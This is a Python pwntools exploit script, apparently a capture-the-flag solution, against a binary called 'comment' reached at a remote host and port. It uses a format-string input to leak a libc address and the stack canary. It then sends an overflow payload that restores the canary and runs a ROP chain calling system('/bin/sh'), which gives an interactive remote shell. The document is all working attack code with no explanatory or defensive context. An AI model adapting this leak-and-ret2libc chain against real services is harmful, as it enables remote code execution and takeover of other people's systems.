from pwn import *

exe = ELF("./comment")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe

# p = process("./comment")
# gdb.attach(p)
p = remote("pwn.toys", 30012)

out = "3=%3$p, 19=%19$p "
# for i in range(18,21):
#     out += f"{i}=%{i}$p "

log.info(f"{out = }")
p.recvuntil(b"name?")
p.sendline(out.encode())

p.recvuntil(b"3=")
leaked_libc = int(p.recvuntil(b",").strip(b",").decode(), 16)
p.recvuntil(b"19=")
canary = int(p.recvline().strip().decode(), 16)

libc.address = leaked_libc - 0x114a37
log.info(f"{hex(libc.address)=}")

pop_rdi_ret = libc.address + 0x2a3e5
ret = libc.address + 0x2db7d 

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))

payload = b"A"*56
payload += p64(canary)
payload += b"B"*8
payload += p64(canary)
payload += b"C"*8
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc_system)
payload += p64(libc_exit) # gracefully :)

p.recvuntil(b"below:")
p.sendline(payload)

p.interactive()